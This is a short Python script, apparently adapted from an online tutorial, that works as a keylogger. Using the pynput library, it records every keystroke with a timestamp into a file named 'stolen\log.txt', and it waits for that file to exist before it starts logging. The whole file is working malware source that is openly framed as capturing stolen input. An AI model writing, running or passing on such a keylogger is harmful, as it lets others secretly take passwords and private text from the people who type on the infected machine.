# Sources:
# https://www.askpython.com/python/examples/python-keylogger
import os.path

from pynput.keyboard import Key, Listener
import logging



def press(key):
    logging.info(str(key))


if __name__ == "__main__":
    while not os.path.exists("stolen\log.txt"):
        pass
    logging.basicConfig(filename=("stolen\log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    with Listener(on_press=press) as listener:
        listener.join()